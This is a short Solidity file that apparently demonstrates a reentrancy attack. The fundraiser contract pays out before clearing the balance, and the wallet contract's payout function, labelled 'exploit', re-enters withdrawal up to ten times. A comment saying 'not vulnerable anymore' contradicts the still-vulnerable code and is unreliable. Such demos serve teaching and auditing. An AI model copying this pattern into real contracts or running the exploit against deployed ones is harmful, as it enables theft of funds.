// SPDX-License-Identifier: MIT
pragma solidity ^0.8.1;

contract DAOFundraiser {
    mapping(address => uint256) balances;

    function withdrawAllMyCoins() public {
        uint256 withdrawAmount = balances[msg.sender];
        // not vulnerable anymore
        // balances[msg.sender] = 0;
        TypicalWallet wallet = TypicalWallet(payable(msg.sender));
        wallet.payout{value: withdrawAmount}();
        balances[msg.sender] = 0;
    }

    function getBalance() public view returns (uint256) {
        return address(this).balance;
    }

    function getDonorBalance(address _donor) public view returns (uint256) {
        return balances[_donor];
    }

    function contribute() public payable {
        balances[msg.sender] += msg.value;
    }

    fallback() external {}

    receive() external payable {}
}

contract TypicalWallet {
    DAOFundraiser fundraiser;
    uint256 r = 10;

    constructor(address fundraiserAddress) public {
        fundraiser = DAOFundraiser(payable(fundraiserAddress));
    }

    function contribute(uint256 _value) public payable {
        fundraiser.contribute{value: _value}();
    }

    function withdraw() public payable {
        fundraiser.withdrawAllMyCoins();
    }

    function getBalance() public view returns (uint256) {
        return address(this).balance;
    }

    function payout() public payable {
        // exploit
        if (r > 0) {
            r--;
            fundraiser.withdrawAllMyCoins();
        }

        // receive payment
        // log or do other activity
        // complex codes
    }

    fallback() external {}
}
